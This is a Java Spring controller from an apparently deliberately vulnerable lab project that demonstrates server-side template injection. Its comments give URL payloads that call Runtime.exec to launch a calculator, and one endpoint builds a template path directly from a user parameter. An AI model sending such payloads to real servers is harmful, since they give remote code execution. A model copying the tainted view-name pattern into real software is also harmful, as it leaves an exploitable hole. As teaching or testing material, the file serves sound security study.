package com.ffffffff0x.exploit;

import io.swagger.annotations.Api;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Api(tags = "SSTI注入")
@Slf4j
@Controller
@RequestMapping("/ssti")
public class SSTI {

    // 测试
    // http://127.0.0.1:8999/ssti/test?hello=f0x
    @GetMapping("/test")
    public String test(String hello, ModelMap map) {
        map.addAttribute("text", hello);
        return "sstitest";
    }

    // return 可控(预处理) (记得把 payload url 编码一下)
    // http://127.0.0.1:8999/ssti/1?name=1&name2=1
    // 触发 http://127.0.0.1:8999/ssti/1?name=${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}&name2=1
    // 不触发 http://127.0.0.1:8999/ssti/1?name=1&name2=${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}
    @GetMapping("/1")
    public String vul(@RequestParam(name="name") String name,@RequestParam(name="name2") String name2, Model model) {
        model.addAttribute("name", name);
        model.addAttribute("name2", name2);
        return "ssti";
    }

    // 视图名称可控
    // http://127.0.0.1:8999/ssti/2?name=zhang3
    // http://127.0.0.1:8999/ssti/2?name=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("open -a Calculator").getInputStream()).next()}__::.x
    @GetMapping("/2")
    public String path(@RequestParam String name) {
        return "user/" + name + "/welcome"; //template path is tainted
    }

}
